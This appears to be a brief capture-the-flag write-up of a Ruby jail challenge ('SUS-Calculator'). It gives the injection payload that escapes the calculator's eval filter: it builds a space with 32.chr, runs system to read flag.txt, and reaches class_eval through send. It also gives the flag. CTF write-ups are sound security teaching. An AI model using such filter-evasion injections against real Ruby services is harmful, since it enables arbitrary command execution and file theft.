# SUS-Calculator 

Solved by: @vicevirus

- Category: mainstream, introductory, ruby
- Description: no eval==safe

### Solution:

```
system('cat'+32.chr+'flag.txt') class_eval ''

ruby .send > use class_eval method 
```

Flag: `jail{me_when_i_uhhh_escape}`


